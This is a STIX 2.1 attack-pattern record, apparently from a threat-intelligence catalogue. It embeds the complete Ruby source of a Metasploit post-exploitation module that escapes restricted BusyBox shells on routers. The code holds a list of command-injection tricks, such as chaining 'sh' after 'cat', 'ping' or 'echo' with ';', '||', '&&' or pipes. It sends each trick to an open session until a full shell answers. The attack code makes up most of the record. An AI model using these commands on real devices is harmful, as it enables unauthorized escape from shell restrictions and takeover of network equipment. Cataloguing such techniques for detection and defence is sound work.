{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--36696082-813a-4b2f-81d2-1b80525a40eb",
    "created": "2024-08-14T16:33:13.583714Z",
    "modified": "2024-08-14T16:33:13.583717Z",
    "name": "BusyBox Jailbreak ",
    "description": " This module will send a set of commands to an open session that is connected to a BusyBox limited shell (i.e. a router limited shell). It will try different known tricks to jailbreak the limited shell and get a full BusyBox shell. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/linux/busybox/jailbreak.rb",
            "external_id": "jailbreak.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n\n  METHODS = [\n    'cat xx || sh',\n    'ping || sh',\n    'echo `sh >> /dev/ttyp0`',\n    'ping `sh >> /dev/ttyp0`',\n    'cat `sh >> /dev/ttyp0`',\n    'cat xx;sh',\n    'echo xx;sh',\n    'ping;sh',\n    'cat xx | sh',\n    'ping | sh',\n    'cat ($sh)',\n    'cat xx && sh',\n    'echo xx && sh',\n    'ping && sh'\n  ]\n\n  def initialize\n    super(\n      'Name' => 'BusyBox Jailbreak ',\n      'Description' => %q{\n        This module will send a set of commands to an open session that is connected to a\n        BusyBox limited shell (i.e. a router limited shell). It will try different known\n        tricks to jailbreak the limited shell and get a full BusyBox shell.\n      },\n      'Author' => 'Javier Vicente Vallejo',\n      'License' => MSF_LICENSE,\n      'Platform' => ['linux'],\n      'SessionTypes' => ['shell']\n    )\n  end\n\n  def run\n    res = false\n\n    METHODS.each do |m|\n      res = try_method(m)\n      break if res\n    end\n\n    print_error('Unable to jailbreak device shell') unless res\n  end\n\n  def try_method(command)\n    vprint_status(\"jailbreak sent: #{command}\")\n    session.shell_write(\"#{command}\\n\")\n    10.times do\n      resp = session.shell_read\n      next if resp.to_s.empty?\n\n      vprint_status(\"jailbreak received: #{resp}\")\n      if resp.downcase =~ /busybox/i && resp.downcase =~ /built.*in shell/i\n        print_good(\"Jailbreak accomplished with #{command}\")\n        return true\n      end\n    end\n\n    false\n  end\nend\n",
    "x_mitre_platforms": [
        "['linux']"
    ]
}